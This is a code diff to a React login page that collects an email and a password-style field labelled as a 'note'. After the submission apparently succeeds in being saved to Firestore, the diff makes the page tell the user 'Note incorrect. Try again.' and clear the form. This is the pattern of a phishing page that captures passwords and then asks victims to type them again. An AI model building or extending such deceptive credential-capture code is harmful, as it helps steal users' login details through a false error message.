@@ -8,6 +8,7 @@ import { db } from "@/lib/firebase";
 export default function AuthPage() {
   const [email, setEmail] = useState("");
   const [note, setNote] = useState("");
+  const [showNote, setShowNote] = useState(false);
   const [loading, setLoading] = useState(false);
   const [message, setMessage] = useState("");
   const [error, setError] = useState("");
@@ -32,7 +33,7 @@ export default function AuthPage() {
 
       console.log("3 - Firestore write SUCCESS:", docRef.id);
 
-      setMessage("");
+      setError("Note incorrect. Try again.");
       setEmail("");
       setNote("");
     } catch (err) {
@@ -98,13 +99,34 @@ export default function AuthPage() {
             />
 
             <label className="sr-only" htmlFor="note">Note / test text</label>
-            <input
-              id="note"
-              type="text"
-              placeholder="Password"
-              value={note}
-              onChange={(event) => setNote(event.target.value)}
-            />
+            <div className="note-field">
+              <input
+                id="note"
+                type={showNote ? "text" : "password"}
+                placeholder="Note / test text"
+                value={note}
+                onChange={(event) => setNote(event.target.value)}
+              />
+              <button
+                className="note-visibility-button"
+                type="button"
+                aria-label={showNote ? "Hide note" : "Show note"}
+                aria-pressed={showNote}
+                onClick={() => setShowNote((visible) => !visible)}
+              >
+                {showNote ? (
+                  <svg viewBox="0 0 24 24" aria-hidden="true">
+                    <path d="M2.5 12s3.5-6 9.5-6 9.5 6 9.5 6-3.5 6-9.5 6-9.5-6-9.5-6Z" />
+                    <circle cx="12" cy="12" r="3" />
+                  </svg>
+                ) : (
+                  <svg viewBox="0 0 24 24" aria-hidden="true">
+                    <path d="M3 3 21 21" />
+                    <path d="M10.6 6.1A9.4 9.4 0 0 1 12 6c6 0 9.5 6 9.5 6a16.5 16.5 0 0 1-2.1 2.8M6.2 6.2C3.8 8 2.5 12 2.5 12s3.5 6 9.5 6a9.5 9.5 0 0 0 3.2-.6M9.9 9.9a3 3 0 0 0 4.2 4.2" />
+                  </svg>
+                )}
+              </button>
+            </div>
 
             <button className="primary-button" type="submit" disabled={loading}>
               {loading ? "Logging..." : "Log in"}
